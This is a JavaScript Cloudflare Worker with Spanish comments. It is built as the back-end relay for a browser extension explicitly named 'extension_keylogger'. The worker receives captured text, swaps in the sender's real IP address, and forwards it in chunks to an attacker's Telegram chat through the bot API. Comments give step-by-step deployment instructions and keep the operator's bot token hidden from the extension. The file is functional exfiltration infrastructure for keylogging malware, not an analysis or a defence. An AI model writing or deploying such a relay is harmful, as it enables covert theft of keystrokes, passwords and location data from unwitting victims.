// Cloudflare Worker - proxy seguro para extension_keylogger
// PEGA ESTE ARCHIVO COMPLETO en dash.cloudflare.com > Workers & Pages > Create Worker > Deploy > Edit code
//
// Secrets a configurar en Settings > Variables (type Secret):
//   BOT_TOKEN = token de BotFather (ej: 123456:AA...)
//   CHAT_ID   = tu chat id (ej: 8178002864)
//   PROXY_KEY = clave que inventas para que solo tu extension pueda usar el proxy
//
// La extension NUNCA ve BOT_TOKEN ni CHAT_ID. Solo conoce PROXY_URL + PROXY_KEY.

const RL = new Map(); // ip -> [timestamps]

function rateOk(ip) {
  const now = Date.now();
  const arr = RL.get(ip) || [];
  const fresh = arr.filter((t) => now - t < 60000);
  if (fresh.length >= 20) return false; // max 20 req/min por IP
  fresh.push(now);
  RL.set(ip, fresh);
  if (RL.size > 2000) RL.clear();
  return true;
}

export default {
  async fetch(request, env) {
    const cors = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, x-key',
    };

    if (request.method === 'OPTIONS') {
      return new Response(null, { status: 204, headers: cors });
    }

    const url = new URL(request.url);
    if (url.pathname !== '/log') {
      return new Response('Not found', { status: 404, headers: cors });
    }
    if (request.method !== 'POST') {
      return new Response('Method not allowed', { status: 405, headers: cors });
    }

    if (!env.BOT_TOKEN || !env.CHAT_ID || !env.PROXY_KEY) {
      return new Response('Worker sin configurar', { status: 500, headers: cors });
    }
    if (request.headers.get('x-key') !== env.PROXY_KEY) {
      return new Response('Forbidden', { status: 403, headers: cors });
    }

    const ip = request.headers.get('cf-connecting-ip') || 'unknown';
    if (!rateOk(ip)) {
      return new Response('Rate limited', { status: 429, headers: cors });
    }

    let body;
    try {
      body = await request.json();
    } catch (e) {
      return new Response('Bad json', { status: 400, headers: cors });
    }

    let text = String(body.text || '').slice(0, 7000);
    if (!text) {
      return new Response('Empty', { status: 400, headers: cors });
    }

    // Si el cliente mando IP "?" (modo nuevo sin ipify), la reemplazamos con la IP real de Cloudflare
    if (text.includes('<code>?</code>') && ip !== 'unknown') {
      text = text.replace('<code>?</code>', `<code>${ip} (cf)</code>`);
    }

    // Telegram corta en ~4096 chars, mandamos en chunks de 3500
    const chunks = [];
    for (let i = 0; i < text.length; i += 3500) chunks.push(text.slice(i, i + 3500));

    for (const c of chunks) {
      const r = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: env.CHAT_ID,
          text: c,
          parse_mode: 'HTML',
          disable_web_page_preview: true,
        }),
      });
      if (!r.ok) {
        const t = await r.text().catch(() => '');
        return new Response('Telegram error: ' + t.slice(0, 200), { status: 502, headers: cors });
      }
    }

    return new Response('OK', { status: 200, headers: cors });
  },
};
